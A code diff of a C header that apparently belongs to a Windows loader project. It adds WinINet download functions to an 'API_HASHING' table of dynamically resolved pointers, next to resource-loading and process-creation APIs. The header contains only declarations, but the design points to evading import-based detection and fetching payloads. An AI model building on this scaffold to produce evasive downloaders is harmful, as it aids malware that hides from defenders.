@@ -1,6 +1,9 @@
+#pragma once
 #include <Windows.h>
 
-// FindResourceW	
+typedef void* HINTERNET;
+
+// FindResourceW
 typedef HRSRC(WINAPI* fnFindResourceW)(HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType);
 // LoadResource
 typedef HGLOBAL(WINAPI* fnLoadResource)(HMODULE hModule, HRSRC hResInfo);
@@ -48,8 +51,18 @@ typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommand
 // DeleteProcThreadAttributeList
 typedef VOID(WINAPI* fnDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
 
-typedef struct _API_HASHING {
+// InternetOpenW	
+typedef HANDLE(WINAPI* fnInternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags);
+// InternetOpenUrlW
+typedef HANDLE(WINAPI* fnInternetOpenUrlW)(HINTERNET hInternet, LPCWSTR lpszUrl, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
+// InternetReadFile
+typedef BOOL(WINAPI* fnInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD  dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
+// InternetCloseHandle
+typedef BOOL(WINAPI* fnInternetCloseHandle)(HINTERNET hInternet);
+// InternetSetOptionW
+typedef BOOL(WINAPI* fnInternetSetOptionW)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
 
+typedef struct _API_HASHING {
 	fnFindResourceW						pFindResourceW;
 	fnLoadResource						pLoadResource;
 	fnLockResource						pLockResource;
@@ -75,6 +88,11 @@ typedef struct _API_HASHING {
 	fnCreateProcessA					pCreateProcessA;
 	fnDeleteProcThreadAttributeList		pDeleteProcThreadAttributeList;
 
+	fnInternetOpenW						pInternetOpenW;
+	fnInternetOpenUrlW					pInternetOpenUrlW;
+	fnInternetReadFile					pInternetReadFile;
+	fnInternetCloseHandle				pInternetCloseHandle;
+	fnInternetSetOptionW				pInternetSetOptionW;
 }API_HASHING, * PAPI_HASHING;
 
 extern API_HASHING g_Api;
